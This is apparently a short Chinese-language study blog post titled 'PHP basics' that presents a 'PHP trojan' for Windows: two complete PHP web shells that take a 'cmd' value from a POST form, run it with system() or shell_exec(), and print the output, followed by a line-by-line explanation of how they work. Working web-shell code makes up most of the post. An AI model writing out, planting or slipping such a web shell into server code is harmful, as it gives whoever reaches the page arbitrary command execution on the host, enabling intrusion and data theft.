---
title: PHP基礎
date: 2025-06-02 13:00:14
tags:
---


php木馬 (windows)

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        echo "<pre>";
        system($cmd);
        echo "</pre>";
    }
    ?>

    <form method="post">
        <input type="text" name="cmd" >
        <button type="submit">執行</button>
    </form>


<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<pre>";
    echo shell_exec($cmd);
    echo "</pre>";
}
?>
<form method="post">
    <input type="text" name="cmd" style="width:300px;">
    <button type="submit">執行</button>
</form>

如果是POST 且body有cmd  $cmd=cmd中的值 執行cmd中命令 並透過echo 印出來

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) 
    $cmd = $_POST['cmd'];
    echo shell_exec($cmd);

輸出<pre></pre> html標籤保留格式，方便顯示 shell 結果

    echo "<pre>";
    echo "</pre>";


包裹住的部分是  後端

    <?php?>

包裹住的地方是前端 method="post" 是方法   submit是執行方法
text 是我輸入的文字 也就是cmd=text


    <form></form>
    <input type="text" name="cmd" style="width:300px;">

